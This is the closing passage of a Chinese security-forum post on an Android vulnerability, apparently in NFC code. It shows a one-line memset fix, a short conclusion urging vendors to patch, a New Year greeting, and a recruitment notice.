  memset(&rw_cb.tcb, 0, sizeof(tRW_TCB));
```

```

总结
--

安卓系统高危的漏洞近几年有多发于硬件设备的趋势. 我们会持续关注该领域最新的漏洞利用, 并呼吁各大厂商及时更新安全补丁.

 

悄悄说一句, 现在是 2021 年 12 月 31 日, 距离明年只剩下 4 个小时. 祝大家新年快乐~~

[【公告】看雪团队招聘 CTF 安全工程师，将兴趣和工作融合在一起！看雪 20 年安全圈的口碑，助你快速成长！](https://job.kanxue.com/position-read-1104.htm)

最后于 3 天前 被 r0Cat 编辑 ，原因：

[#漏洞分析](forum-150-1-153.htm) [#Andorid](forum-150-1-162.htm)